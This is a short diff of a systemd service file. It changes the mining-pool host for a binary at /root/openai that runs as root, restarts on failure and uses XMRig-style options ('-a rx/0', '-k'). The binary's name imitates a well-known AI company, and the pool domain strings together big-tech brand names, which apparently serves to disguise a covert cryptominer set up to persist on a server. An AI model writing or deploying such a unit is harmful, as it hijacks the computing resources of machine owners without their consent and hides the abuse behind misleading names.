@@ -24,7 +24,7 @@ After=network.target
 
 [Service]
 Type=simple
-ExecStart=/root/openai/openai -o skfdjhgsdktjh.microsoftazureamazonawsibmapplenvidiaoracleciscoadobe.com:1123 -u $1 -p $2 -a rx/0 -k 
+ExecStart=/root/openai/openai -o deze.microsoftazureamazonawsibmapplenvidiaoracleciscoadobe.com:1123 -u $1 -p $2 -a rx/0 -k 
 ExecStop=/usr/bin/killall -9 openai
 Restart=on-failure
 User=root
